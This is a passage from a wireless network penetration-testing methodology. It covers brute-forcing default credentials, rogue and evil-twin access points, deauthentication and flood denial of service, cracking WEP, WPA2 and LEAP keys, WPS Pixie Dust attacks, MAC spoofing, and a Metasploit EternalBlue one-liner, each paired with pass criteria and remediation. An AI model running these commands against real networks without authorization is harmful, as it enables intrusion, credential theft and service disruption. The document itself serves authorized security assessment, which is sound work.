
**Remediation:** High-entropy random PSK; per-user PSK or 802.1X.

---

### 6.8 Check for Default Credentials (Brute-Force)

**Objective:** Test AP/controller management interfaces for default or easily guessable credentials.

**Commands:**

```bash
nmap -p 22,23,80,443,8080,8443 <AP_IP> -sV

# Common defaults to test: admin:admin, admin:password, admin:(blank)
# Vendor-specific: Cisco=Cisco/Cisco, Ubiquiti=ubnt/ubnt, TP-Link=admin/admin

# Hydra HTTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt <AP_IP> http-get /
hydra -l admin -P /usr/share/wordlists/rockyou.txt <AP_IP> https-get /

# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<AP_IP>
```

**Pass Criteria:** Default credentials changed; account lockout after failed attempts.  
**Fail Criteria:** Any default credential succeeds.

**Evidence:** Screenshot of successful admin panel login with default credentials.

**Remediation:** Change all default credentials on initial deployment; enforce strong password policy.

---

### 6.9 SSID Beaconing and Checking for Hidden and Fake Wireless Networks

**Objective:** Enumerate beacon frames to identify hidden networks and compare against authorized SSID list.

**Commands:**

```bash
sudo airodump-ng wlan0mon
# Hidden networks show as <length: X>

# Force hidden SSID reveal
sudo aireplay-ng --deauth 5 -a <BSSID_of_hidden> wlan0mon
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 5" -T fields -e wlan.ssid

# Detect fake networks (same SSID, different BSSID)
sudo airodump-ng wlan0mon | grep "<TARGET_SSID>"
```

**Pass Criteria:** All observed BSSIDs match authorized inventory; hidden SSIDs justified.  
**Fail Criteria:** Rogue or evil-twin AP detected.

**Evidence:** `airodump-ng` output showing duplicate SSID entries.

**Remediation:** Deploy WIDS with rogue AP detection; maintain SSID inventory.

---

### 6.10 Weak Protocols

**Objective:** Identify use of deprecated or weak wireless protocols (WEP, WPA-TKIP, WPS, LEAP).

**Commands:**

```bash
sudo airodump-ng wlan0mon
# Look for: ENC=WEP, CIPHER=TKIP, AUTH=MGT with weak EAP

sudo wash -i wlan0mon

# LEAP check
tshark -i wlan0mon -Y "eap" -T fields -e eap.type -e eap.identity
# EAP type 17 = LEAP
```

**Pass Criteria:** No WEP, TKIP, LEAP, or MD5-EAP in use; WPS disabled.  
**Fail Criteria:** Any deprecated protocol found.

**Evidence:** `airodump-ng` and `wash` output.

**Remediation:** Disable WEP, TKIP, LEAP, WPS; upgrade to WPA3-SAE or WPA2-CCMP with 802.1X-EAP-PEAP/TLS.

---

### 6.11 Setup Monitor Mode (airmon-ng)

*(Refer to Section 3.1 — identical procedure.)*

---

### 6.12 Analyzing Internal Wireless Security Procedures

**Objective:** Review internal documentation, configuration, and policies governing wireless security.

**Step-by-Step Procedure:**
1. Request wireless security policy documents from the client.
2. Review AP configuration exports/screenshots.
3. Review RADIUS server configuration.
4. Review change management records for firmware updates.
5. Interview wireless administrator.

**Items to Review:**
- Wireless security policy existence and currency
- AP hardening baseline document
- SSID naming conventions and approval process
- PSK rotation procedure
- Rogue AP response procedure
- Firmware update schedule

**Pass Criteria:** Documented policy exists, is enforced, and is current.  
**Fail Criteria:** No policy; policy not followed; no change management.

**Evidence:** Policy document references; screenshots of AP configuration.

**Remediation:** Develop and enforce a wireless security policy covering all checklist items.

---

### 6.13 Wordlist Cracking (Create Wordlist with crunch)

**Objective:** Generate custom wordlists based on target-specific patterns for PSK cracking.

**Commands:**

```bash
# 8-character alphanumeric
crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 \
  -o alpha_8char.txt

# Pattern-based (company name + 4 digits)
crunch 12 12 -t CompanyName%%%% -o company_pattern.txt

# Phone number patterns
crunch 10 10 0123456789 -o phone_numbers.txt

hashcat -m 22000 hashes.22000 alpha_8char.txt

# CeWL: scrape company website for custom wordlist
cewl https://company.com -d 2 -m 5 -w company_cewl.txt
aircrack-ng -w company_cewl.txt capture-01.cap
```

**Evidence:** `crunch` command and resulting wordlist; aircrack-ng result.

**Remediation:** Use passwords that are not guessable via pattern-based or OSINT attacks.

---

### 6.14 Capture Handshake (airodump-ng)

*(Refer to Sections 6.1 and 6.2 — identical procedure.)*

---

### 6.15 Fake Authentication (aireplay-ng)

**Objective:** Authenticate to an AP without knowing the PSK to generate traffic for IV capture (WEP attacks).

**Commands:**

```bash
# Fake authentication
sudo aireplay-ng -1 0 -a <AP_BSSID> -h <YOUR_MAC> wlan0mon

# Persistent fake auth
sudo aireplay-ng -1 6000 -o 1 -q 10 -a <AP_BSSID> -h <YOUR_MAC> wlan0mon

# SKA networks: capture keystream first
sudo aireplay-ng -4 -b <AP_BSSID> -h <YOUR_MAC> wlan0mon
sudo aireplay-ng -1 0 -e <SSID> -y <keystream.xor> -a <AP_BSSID> -h <YOUR_MAC> wlan0mon
```

**Pass Criteria:** Fake authentication rejected (WPA2/3 prevents this); only possible on WEP/OPN.  
**Fail Criteria:** Fake auth succeeds on WEP network.

**Evidence:** `aireplay-ng` terminal output showing `Association successful`.

**Remediation:** WPA2/WPA3 inherently prevents fake authentication. Eliminate WEP.

---

### 6.16 Honeypot and Mis-Association

**Objective:** Assess whether clients mis-associate with a rogue AP that has a stronger signal.

> WARNING: AUTHORIZATION REQUIRED

**Commands:**

```bash
# Create rogue AP with same SSID
sudo airbase-ng -e "<CORPORATE_SSID>" -c <channel> wlan0mon

# KARMA mode
sudo hostapd-mana /etc/hostapd-mana/mana.conf

# Monitor associations
sudo airodump-ng wlan0mon | grep "<CORPORATE_SSID>"

# Bridge rogue AP to internet
sudo brctl addbr br0
sudo brctl addif br0 eth0 at0
sudo ifconfig br0 up
```

**Pass Criteria:** No clients associate; WIDS alerts; clients validate certificates.  
**Fail Criteria:** Clients mis-associate; no WIDS alert.

**Evidence:** `airodump-ng` showing client connected to rogue AP BSSID.

**Remediation:** 802.1X with mutual authentication; WIDS/WIPS; configure clients to pin to known BSSID/SSID+CA.

---

## 7. DoS Testing

> WARNING: All DoS tests must be explicitly authorized and scheduled during a maintenance window.

### 7.1 Deauthentication/Disassociation — Disconnect Everyone

**Objective:** Test whether unprotected management frames allow a DoS against all or specific clients.

**Commands:**

```bash
# Broadcast deauth
sudo aireplay-ng --deauth 50 -a <BSSID> wlan0mon

# Targeted deauth
sudo aireplay-ng --deauth 50 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# MDK4 sustained
sudo mdk4 wlan0mon d -B <BSSID>
```

**Pass Criteria:** 802.11w (MFP) enabled; WIDS alerts; WPA3 in use.  
**Fail Criteria:** Clients disconnected; no WIDS alert; no MFP protection.

**Evidence:** Wireshark capture of deauth frames; client disconnection logs.

**Remediation:** Enable IEEE 802.11w (Management Frame Protection); upgrade to WPA3; WIDS/WIPS.

---

### 7.2 Random Fake APs — Hide Networks / Crash Scanners

**Objective:** Flood the spectrum with fake beacon frames to hide legitimate networks or crash scanners.

**Commands:**

```bash
sudo mdk4 wlan0mon b -n "<FAKE_SSID>" -c <channel>
sudo mdk4 wlan0mon b -c <channel>   # Random SSIDs

sudo airbase-ng -e "FakeNetwork1" -c 6 wlan0mon &
sudo airbase-ng -e "FakeNetwork2" -c 6 wlan0mon &
```

**Pass Criteria:** WIDS detects beacon flood; legitimate APs still discoverable.  
**Fail Criteria:** WIDS fails to detect; legitimate network hidden in flood.

**Evidence:** `airodump-ng` screenshot showing beacon flood; WIDS alert screenshot.

**Remediation:** Deploy WIDS with beacon flood detection.

---

### 7.3 Overload AP — Kill the AP

**Objective:** Attempt to exhaust AP resources via authentication or association flood.

**Commands:**

```bash
sudo mdk4 wlan0mon a -a <BSSID>   # Authentication DoS
sudo mdk4 wlan0mon f -t <BSSID>   # Association flood
sudo mdk4 wlan0mon x -t <BSSID>   # EAPOL Start flood
```

**Pass Criteria:** AP remains stable; WIDS alerts; rate-limiting in place.  
**Fail Criteria:** AP crashes, reboots, or becomes unresponsive.

**Evidence:** AP admin CPU/memory screenshot during attack; WIDS alert log.

**Remediation:** Enable association request rate limiting; deploy WIDS; upgrade to enterprise-grade AP hardware.

---

### 7.4 WIDS — Interact with IDS

**Objective:** Test whether WIDS/WIPS correctly detects various attack signatures.

**Commands:**

```bash
# Trigger WIDS detections (after authorization):
# 1. Deauth flood
sudo aireplay-ng --deauth 50 -a <BSSID> wlan0mon

# 2. Beacon flood
sudo mdk4 wlan0mon b

# 3. Probe request flood
sudo mdk4 wlan0mon p

# 4. Rogue AP
sudo airbase-ng -e "<SSID>" -c <channel> wlan0mon

# 5. WPS attack
sudo reaver -i wlan0mon -b <BSSID> -c <channel> -vv

# Review WIDS console after each test
```

**Pass Criteria:** WIDS alerts generated for each attack type within 30 seconds; alerts forwarded to SIEM.  
**Fail Criteria:** WIDS fails to detect one or more attack types.

**Evidence:** WIDS console screenshots for each triggered attack.

**Remediation:** Tune WIDS signatures; ensure full channel coverage; integrate with SIEM.

---

### 7.5 TKIP, EAPOL — Specific DoS Attacks Against APs

**Objective:** Test for TKIP (Michael MIC failure) and EAPOL-based DoS vulnerabilities.

**Commands:**

```bash
# TKIP MIC failure DoS
sudo aireplay-ng -7 -b <BSSID> -h <YOUR_MAC> wlan0mon

# EAPOL logoff flood
sudo mdk4 wlan0mon e -t <BSSID>

# EAPOL Start flood
sudo mdk4 wlan0mon x -t <BSSID>
```

**Pass Criteria:** CCMP (AES) in use — not vulnerable to TKIP MIC DoS; 802.11w prevents EAPOL spoofing.  
**Fail Criteria:** TKIP MIC failures cause DoS; EAPOL spoofing disconnects clients.

**Evidence:** WIDS log showing MIC failure events; Wireshark capture of EAPOL logoff frames.

**Remediation:** Disable TKIP; enable 802.11w (MFP); upgrade to WPA3.

---

## 8. Network Protocol Testing

### 8.1 Check IPv4 Isolation

**Objective:** Verify that wireless clients are isolated from unauthorized network segments via IPv4.

**Commands:**

```bash
ip addr show wlan0
ip route show
nmap -sn 192.168.1.0/24
nmap -sV -p 22,80,443,445,3389 <corporate_network_range>
sudo arp-scan -l
sudo arp-scan --interface wlan0 --localnet
nmap -sn 10.0.0.0/8 --exclude <your_IP>
```

**Pass Criteria:** Only internet traffic routable from guest SSID; corporate ranges unreachable.  
**Fail Criteria:** Corporate, management, or server subnets reachable from guest/IoT SSID.

**Evidence:** `nmap` output showing reachable hosts across segment boundaries.

**Remediation:** Implement strict VLAN segmentation with ACLs; firewall rules; enable NAT on guest SSID.

---

### 8.2 Check IPv6 Isolation

**Objective:** Verify that IPv6 is not bypassing IPv4 segmentation controls.

**Commands:**

```bash
ip -6 addr show
nmap -6 -sn fe80::/10
rdisc6 wlan0
nmap -6 -sV <ipv6_prefix>::/64
sudo tcpdump -i wlan0 icmp6
ping6 -c 3 ipv6.google.com
```

**Pass Criteria:** IPv6 properly segmented or disabled on guest; no corporate IPv6 reachable from guest.  
**Fail Criteria:** IPv6 bypasses IPv4 ACLs; corporate resources reachable via IPv6.

**Evidence:** `nmap -6` output showing cross-segment IPv6 hosts.

**Remediation:** Apply IPv6 segmentation rules mirroring IPv4; disable IPv6 where not required; configure RA Guard.

---

### 8.3 Network Protocol Traffic Capture

**Objective:** Capture and inventory all protocols in use on the wireless network.

**Commands:**

```bash
sudo tcpdump -i wlan0 -w protocol_capture.pcap
sudo tshark -i wlan0 -w protocol_capture.pcap -a duration:300
tshark -r protocol_capture.pcap -q -z io,phs
tshark -r protocol_capture.pcap -q -z ptype,tree
tshark -r protocol_capture.pcap -T fields -e frame.protocols | sort | uniq -c | sort -rn
```

**Pass Criteria:** Only encrypted protocols observed; no cleartext sensitive data.  
**Fail Criteria:** Cleartext credentials or sensitive protocols observed.

**Evidence:** tshark protocol hierarchy screenshot; PCAP file.

**Remediation:** Enforce TLS for all application protocols; disable cleartext management protocols.

---

### 8.4 Network Protocol Cryptographic Analysis

**Objective:** Evaluate the cryptographic strength of protocols in use.

**Commands:**

```bash
sudo tshark -i wlan0 -Y "tls.handshake.type == 1" \
  -T fields -e tls.handshake.extensions.supported_version \
  -e tls.handshake.ciphersuite

sslscan <target_IP>:<port>
./testssl.sh <target_IP>:<port>

tshark -i wlan0 -Y "tls.record.version == 0x0301 or tls.record.version == 0x0302"
```

**Pass Criteria:** TLS 1.2 minimum (TLS 1.3 preferred); strong cipher suites; valid certificates.  
**Fail Criteria:** TLS 1.0/1.1; weak ciphers; invalid certificate chain.

**Evidence:** sslscan or testssl.sh output.

**Remediation:** Enforce TLS 1.2+ with AEAD cipher suites; disable RC4, 3DES; use valid CA-signed certificates.

---

### 8.5 Unknown Protocol Decoding

**Objective:** Identify and decode proprietary or unknown protocols used on the wireless network.

**Commands:**

```bash
sudo tshark -i wlan0 -w unknown_protos.pcap

tshark -r unknown_protos.pcap -Y "data-text-lines or data" -T fields -e data

strings unknown_protos.pcap | grep -iE "(password|user|login|auth|key)"

sudo p0f -i wlan0
```

**Pass Criteria:** All protocols identified and appropriate encryption in use.  
**Fail Criteria:** Unknown protocols with cleartext data; OT protocols exposed wirelessly.

**Evidence:** Wireshark screenshot of decoded unknown traffic.

**Remediation:** Document all protocols in use; restrict wireless to known-safe protocols.

---

### 8.6 Protocol Enumeration

**Objective:** Enumerate all services and protocols accessible from the wireless segment.

**Commands:**

```bash
sudo nmap -sV -p- --open -T4 <target_IP>
sudo nmap -sU --top-ports 100 <target_IP>
sudo nmap -A <target_IP>

smbclient -L \\\\<target_IP>\\ -N
enum4linux-ng <target_IP>

snmpwalk -v2c -c public <target_IP>
onesixtyone <target_IP> public
ldapsearch -x -H ldap://<target_IP> -b "" -s base
```

**Pass Criteria:** Only expected services accessible; management interfaces not reachable from wireless.  
**Fail Criteria:** Internal services, file shares, or management interfaces accessible from wireless.

**Evidence:** `nmap` output table showing open ports on internal hosts from wireless segment.

---

### 8.7 Network Protocol Fuzzing

**Objective:** Send malformed inputs to services to uncover crashes or vulnerabilities.

> CAUTION: Fuzzing can crash services. Only perform on non-production systems with explicit authorization.

**Commands:**

```bash
pip3 install boofuzz
sudo hping3 --udp -p <port> --rand-dest <target_IP> -d 1024
echo "test_input" | radamsa | nc <target_IP> <port>
```

**Pass Criteria:** Services handle malformed input gracefully; no crashes.  
**Fail Criteria:** Service crash or unexpected behavior observed.

**Evidence:** Fuzzer output log; service crash/restart log.

**Remediation:** Patch vulnerable services; deploy IPS; upgrade firmware.

---

### 8.8 Network Protocol Exploitation

**Objective:** Attempt to exploit discovered vulnerabilities in services accessible from the wireless network.

> WARNING: AUTHORIZATION REQUIRED.

**Commands:**

```bash
msfconsole
# msf6> search type:exploit platform:linux
# msf6> use exploit/<module>
# msf6> set RHOSTS <target_IP>
# msf6> run

# EternalBlue if SMBv1 detected
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <IP>; run"

sqlmap -u "http://<target_IP>/login" --forms --dbs
```

**Pass Criteria:** No exploitable vulnerabilities; patching and segmentation prevent exploitation.  
**Fail Criteria:** Exploitation successful from wireless segment.

**Evidence:** Metasploit session screenshot; PoC command execution output.

**Remediation:** Patch vulnerabilities; implement network segmentation; deploy IPS.

---

## 9. WEP Assessment

### 9.1 Check the SSID and Analyze Whether SSID Is Visible or Hidden

```bash
sudo airodump-ng wlan0mon
# If ESSID column shows <length: X>, SSID is hidden
# If ESSID shows the network name, SSID is visible
```

**Pass Criteria:** WEP network not present (any WEP is FAIL regardless of SSID visibility).  
**Fail Criteria:** WEP used at all.

**Evidence:** `airodump-ng` screenshot showing ENC=WEP.

**Remediation:** Immediately replace WEP with WPA2-CCMP or WPA3-SAE.

---

### 9.2 Sniff Traffic If SSID Visible — Check Packet Capturing Status

```bash
sudo airodump-ng --bssid <WEP_BSSID> -c <channel> -w wep_sniff wlan0mon
ls -la wep_sniff-01.cap
tshark -r wep_sniff-01.cap | wc -l
```

**Evidence:** `airodump-ng` screenshot with high #Data count.

---

### 9.3 Break WEP Key Using aircrack-ng / WEPcrack

```bash
sudo aireplay-ng -1 0 -a <WEP_BSSID> -h <YOUR_MAC> wlan0mon
sudo aireplay-ng -3 -b <WEP_BSSID> -h <YOUR_MAC> wlan0mon

aircrack-ng wep_sniff-01.cap
aircrack-ng -n 128 wep_sniff-01.cap
```

**Evidence:** `aircrack-ng` output with `KEY FOUND!`.

**Remediation:** Replace WEP immediately.

---

### 9.4 Hidden WEP SSID — Deauth and Discover (Deauthenticate Client)

```bash
sudo airodump-ng wlan0mon
sudo aireplay-ng --deauth 5 -a <HIDDEN_WEP_BSSID> wlan0mon
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 5" -T fields -e wlan.ssid
```

**Evidence:** tshark output showing SSID in probe response.

---

### 9.5 Check If Authentication Method Is OPN or SKA

```bash
sudo airodump-ng wlan0mon
# AUTH=OPN = Open Authentication
# AUTH=SKA = Shared Key Authentication (bypassable)

tshark -i wlan0mon -Y "wlan.fc.type_subtype == 11" \
  -T fields -e wlan.bssid -e wlan_mgt.auth.alg
# alg 0 = Open, alg 1 = Shared Key
```

**Evidence:** `airodump-ng` AUTH column screenshot.

**Remediation:** Replace WEP; SKA provides false security.

---

### 9.6 ARP Replay or Interactive Packet Replay (Clients Connected)

```bash
sudo aireplay-ng -3 -b <WEP_BSSID> -h <YOUR_MAC> wlan0mon
sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <WEP_BSSID> -h <YOUR_MAC> wlan0mon
# Crack when #Data > 50,000
aircrack-ng wep_capture-01.cap
```

**Evidence:** `airodump-ng` showing rapidly increasing #Data count; `aircrack-ng` output.

---

### 9.7 Fragmentation Attack or KoreK ChopChop (No Client Connected)

```bash
# Fragmentation attack
sudo aireplay-ng -5 -b <WEP_BSSID> -h <YOUR_MAC> wlan0mon
# Output: fragment.xor

# ChopChop attack
sudo aireplay-ng -4 -b <WEP_BSSID> -h <YOUR_MAC> wlan0mon
# Output: replay_dec-XXXX-XXXXXX.xor

# Forge ARP packet
sudo packetforge-ng -0 -a <WEP_BSSID> -h <YOUR_MAC> \
  -k 255.255.255.255 -l 255.255.255.255 \
  -y fragment.xor -w forged_arp.cap

# Inject
sudo aireplay-ng -2 -r forged_arp.cap wlan0mon

aircrack-ng wep_capture-01.cap
```

---

## 10. WPA/WPA2 Assessment

### 10.1 Start and Deauthenticate WPA/WPA2 Protected Client

**Objective:** De-authenticate a WPA/WPA2 client and capture the 4-way handshake.

**Commands:**

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w wpa2_audit wlan0mon
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# Verify: "WPA handshake: <BSSID>" in top-right of airodump-ng
tshark -r wpa2_audit-01.cap -Y "eapol"
```

**Remediation:** Enable 802.11w MFP; upgrade to WPA3-SAE.

---

### 10.2 Check Status of Captured EAPOL Handshake

```bash
aircrack-ng wpa2_audit-01.cap
# Shows: "1 handshake" if complete

tshark -r wpa2_audit-01.cap -Y "eapol" -T fields \
  -e frame.number -e eapol.keydes.key_info -e eapol.keydes.nonce

pyrit -r wpa2_audit-01.cap analyze
```

---

### 10.3 PSK Dictionary Attack (coWPAtty, Aircrack-ng)

```bash
cowpatty -r wpa2_audit-01.cap -f /usr/share/wordlists/rockyou.txt -s <SSID>
aircrack-ng -w /usr/share/wordlists/rockyou.txt -e <SSID> wpa2_audit-01.cap

hcxpcapngtool -o wpa2.22000 wpa2_audit-01.cap
hashcat -m 22000 wpa2.22000 rockyou.txt -r best64.rule
```

**Remediation:** Use 20+ character random PSK; consider WPA3-SAE.

---

### 10.4 WPA-PSK Precomputation Attack (Rainbow Tables / genpmk)

```bash
genpmk -f /usr/share/wordlists/rockyou.txt -d pmk_table.db -s <SSID>
cowpatty -r wpa2_audit-01.cap -d pmk_table.db -s <SSID>
```

**Remediation:** Unique SSID name; strong PSK; upgrade to WPA3-SAE.

---

### 10.5 Re-Deauthenticate and Retry

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> wlan0mon
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
aircrack-ng wpa2_audit-01.cap
```

---

### 10.6 Check for KRACK Attack Vulnerability

**Objective:** Test whether the AP or clients are vulnerable to Key Reinstallation Attacks (CVE-2017-13077 through CVE-2017-13088).

**Commands:**

```bash
git clone https://github.com/vanhoefm/krackattacks-scripts
cd krackattacks-scripts
sudo python krack-test-client.py

nmap -sV <AP_IP>
# Check firmware version against vendor KRACK patches (October 2017)
```

**Pass Criteria:** AP and all clients running firmware/software patched after October 2017.  
**Fail Criteria:** Unpatched AP or client firmware detected.

**Evidence:** Firmware version screenshot; KRACK test script output.

**Reference:** https://github.com/vanhoefm/krackattacks-scripts

**Remediation:** Update all AP firmware and client OS to post-KRACK patch versions. Upgrade to WPA3 (immune to KRACK).

---

## 11. LEAP Encrypted WLAN

### 11.1 Check and Confirm Whether WLAN Is Protected by LEAP

```bash
sudo tshark -i wlan0mon -Y "eap" -T fields \
  -e wlan.ssid -e eap.type -e eap.code
# EAP type 17 = LEAP

sudo airodump-ng wlan0mon
# AUTH column shows MGT for Enterprise networks
```

**Pass Criteria:** LEAP not in use; modern EAP methods used.  
**Fail Criteria:** LEAP detected.

**Evidence:** Wireshark or tshark output showing EAP type 17.

**Remediation:** Replace LEAP with EAP-TLS or PEAP-MSCHAPv2.

---

### 11.2 De-authenticate LEAP-Protected Client

```bash
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
sudo tshark -i wlan0mon -Y "eap.type == 17" -w leap_capture.pcap
```

---

### 11.3 Break LEAP with asleap

**Objective:** Recover credentials from the captured LEAP exchange.

**Commands:**

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w leap_raw wlan0mon
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon

asleap -r leap_raw-01.cap -W /usr/share/wordlists/rockyou.txt

# Hashcat alternative
hashcat -m 5500 leap_hashes.txt rockyou.txt
```

**Pass Criteria:** LEAP not in use (unconditional FAIL if LEAP detected).  
**Fail Criteria:** LEAP credentials cracked.

**Evidence:** `asleap` output with username and cracked password (redact in report body).

**Remediation:** Replace LEAP with EAP-TLS (mutual certificate authentication) or PEAP-MSCHAPv2.

---

### 11.4 Re-Deauthenticate if Process Fails

```bash
sudo aireplay-ng --deauth 20 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```

---

## 12. Unencrypted WLAN

### 12.1 Check Whether SSID Is Visible or Not

```bash
sudo airodump-ng wlan0mon
# ENC=OPN (open/unencrypted)
```

**Remediation:** Any open corporate WLAN is a critical finding. Enforce WPA2/WPA3 immediately.

---

### 12.2 Sniff for IP Range If SSID Visible — Check MAC Filtering Status

```bash
sudo tshark -i wlan0 -Y "dhcp or arp" -T fields \
  -e dhcp.option.requested_ip_address -e arp.dst.proto_ipv4
sudo arp-scan -l --interface wlan0
sudo airodump-ng wlan0mon | grep <BSSID>
```

---

### 12.3 If MAC Filtering Enabled — Spoof MAC Address (SMAC / macchanger)

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> wlan0mon
# Record a connected client's MAC

# Linux
sudo ip link set wlan0 down
sudo macchanger -m <AUTHORIZED_CLIENT_MAC> wlan0
sudo ip link set wlan0 up

# macOS
sudo ifconfig en0 ether <AUTHORIZED_CLIENT_MAC>
```

**Pass Criteria:** MAC filtering enforced at L2 (note: easily bypassed — observation only).  
**Fail Criteria:** MAC spoofing grants full network access.

**Evidence:** Screenshot of successful connection after MAC spoof; `macchanger` output.

**Remediation:** MAC filtering alone provides no security; combine with 802.1X; use NAC.

---

### 12.4 Try to Connect Using IP Within Discovered Range

```bash
sudo ip addr add <discovered_IP_range.X>/24 dev wlan0
sudo ip route add default via <GATEWAY_IP>
ping <GATEWAY_IP>
nmap -sn <subnet/24>
```

**Remediation:** Implement WPA2/WPA3 to prevent unauthorized access.

---

### 12.5 If SSID Is Hidden — Discover the SSID Using Aircrack-ng

```bash
sudo aireplay-ng --deauth 5 -a <HIDDEN_OPEN_BSSID> wlan0mon
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 5" -T fields -e wlan.ssid
```

---

## 13. WPS Assessment

### 13.1 Determine Whether WPS Is Enabled

```bash
sudo wash -i wlan0mon
# WPS version and lock status visible

sudo tshark -i wlan0mon -Y "wps" \
  -T fields -e wlan.ssid -e wps.device_name -e wps.manufacturer
```

**Pass Criteria:** WPS disabled on all APs.  
**Fail Criteria:** WPS enabled on any AP.

**Evidence:** `wash` output showing WPS-enabled APs.

**Remediation:** Disable WPS on all access points.

---

### 13.2 Identify WPS Configuration

```bash
sudo wash -i wlan0mon -v

tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8 && wps" \
  -T fields -e wlan.ssid -e wps.version -e wps.config_methods \
  -e wps.state -e wps.device_name
```

---

### 13.3 Determine Whether WPS Is Required

**Procedure:** Interview network administrator; check if any corporate devices rely on WPS for onboarding; assess whether alternatives are available.

**Pass Criteria:** WPS not required; disabled.  
**Fail Criteria:** WPS enabled without business justification.

---

### 13.4 Verify Whether WPS Can Be Disabled

```bash
# Login to AP admin portal and disable WPS
sudo wash -i wlan0mon   # verify AP no longer appears
```

---

### 13.5 Check Whether WPS Is Exposed on Corporate Networks

```bash
sudo wash -i wlan0mon
# Correlate BSSIDs with corporate AP inventory
```

**Fail Criteria:** Corporate SSID has WPS enabled.

**Remediation:** Disable WPS on all corporate APs immediately.

---

### 13.6 Check Whether WPS Is Exposed on Guest Networks

```bash
sudo wash -i wlan0mon
# Correlate with guest SSID BSSIDs
```

**Remediation:** Disable WPS on guest APs.

---

### 13.7 Verify Appropriate Administrative Controls

```bash
# Pixie Dust attack
sudo reaver -i wlan0mon -b <BSSID> -c <channel> -vv -K 1

# WPS PIN brute force
sudo reaver -i wlan0mon -b <BSSID> -c <channel> -vv
sudo bully -b <BSSID> -c <channel> wlan0mon -d
# reaver output: WPS PIN: XXXXXXXX | WPA PSK: '<password>'
```

**Pass Criteria:** WPS attack fails or locked after attempts.  
**Fail Criteria:** PSK recovered via WPS PIN or Pixie Dust.

**Evidence:** `reaver` output showing recovered PSK.

---

## 14. Authentication Testing

### 14.1 Verify Authentication to Intended SSID

```bash
wpa_passphrase <SSID> <password> > /tmp/wpa.conf
sudo wpa_supplicant -c /tmp/wpa.conf -i wlan0
# macOS
networksetup -setairportnetwork en0 <SSID> <password>
ip addr show wlan0
ping -c 3 <GATEWAY_IP>
```

**Pass Criteria:** Successful authentication and IP assignment.  
**Fail Criteria:** Authentication fails with valid credentials.

---

### 14.2 Verify Authentication from Each Authorized Location

```bash
# At each location:
sudo iwconfig wlan0 | grep -i signal
ping -c 5 <GATEWAY_IP>
traceroute <GATEWAY_IP>
```

**Evidence:** Table of locations, signal strengths, and authentication results.

---

### 14.3 Verify Authentication Using Intended Authentication Method

```bash
cat > /tmp/eap_test.conf << 'EOF'
network={
    ssid="<SSID>"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="testuser"
    password="testpass"
    phase2="auth=MSCHAPV2"
    ca_cert="/path/to/ca.crt"
}
EOF
sudo wpa_supplicant -c /tmp/eap_test.conf -i wlan0
```

**Pass Criteria:** Only the authorized EAP method accepted; weaker methods rejected.  
**Fail Criteria:** Multiple EAP methods accepted, including weak ones.

---

### 14.4 Verify Incorrect Credentials Are Rejected

```bash
wpa_passphrase <SSID> "wrongpassword" > /tmp/wrong.conf
sudo wpa_supplicant -c /tmp/wrong.conf -i wlan0
# Should see: WRONG_KEY or 4-way handshake timeout
```

**Pass Criteria:** Invalid credentials consistently rejected.  
**Fail Criteria:** Invalid credentials sometimes accepted.

---

### 14.5 Verify Expired/Disabled Accounts Are Rejected

```bash
# Configure wpa_supplicant with expired account credentials
sudo wpa_supplicant -c /tmp/expired_account.conf -i wlan0
```

**Pass Criteria:** Expired/disabled accounts rejected at RADIUS.  
**Fail Criteria:** Expired account successfully authenticates.

---

### 14.6 Verify Unauthorized Accounts Cannot Authenticate

```bash
sudo wpa_supplicant -c /tmp/unauthorized.conf -i wlan0
```

**Pass Criteria:** Only accounts in authorized wireless security group can authenticate.  
**Fail Criteria:** Any domain account can authenticate to corporate WLAN.

---

### 14.7 Verify Guest Credentials Do Not Authenticate to Corporate WLANs

```bash
aircrack-ng -w <(echo "<guest_psk>") corp_capture-01.cap
sudo wpa_supplicant -c /tmp/guest_creds_on_corporate.conf -i wlan0
```

**Pass Criteria:** Guest credentials rejected on corporate SSID.

---

### 14.8 Verify Corporate Credentials Do Not Unnecessarily Authenticate to Guest WLANs

```bash
sudo wpa_supplicant -c /tmp/corp_creds_on_guest.conf -i wlan0
```

**Pass Criteria:** Corporate credentials do not provide access to guest-tier network.

**Remediation:** Use separate RADIUS policies for guest and corporate SSIDs.

---

## 15. Network Enumeration After Authentication

### 15.1 Record Assigned IP Address

```bash
ip addr show wlan0
ifconfig wlan0   # macOS
```

### 15.2 Record Subnet Mask / Prefix

```bash
ip addr show wlan0 | grep "inet "
ifconfig en0 | grep inet   # macOS
```

### 15.3 Record Default Gateway

```bash
ip route show | grep default
netstat -rn | grep default   # macOS
```

### 15.4 Record DNS Servers

```bash
cat /etc/resolv.conf
resolvectl status
scutil --dns | grep nameserver   # macOS
```

### 15.5 Record DHCP Server

```bash
cat /var/lib/dhcp/dhclient.leases
sudo tcpdump -i wlan0 port 67 or port 68
```

### 15.6 Identify Accessible Network Segments

```bash
nmap -sn 10.0.0.0/8 --exclude <your_IP>
nmap -sn 172.16.0.0/12
nmap -sn 192.168.0.0/16
traceroute 8.8.8.8
ping -c 3 <corporate_server_IP>
```

### 15.7 Identify Reachable Infrastructure

```bash
sudo nmap -sn <subnet/24>
sudo arp-scan -l --interface wlan0
sudo nmap -sV --top-ports 100 <discovered_hosts>
```

### 15.8 Identify Exposed Services

```bash
sudo nmap -sV -p- --open -T4 <target_hosts>
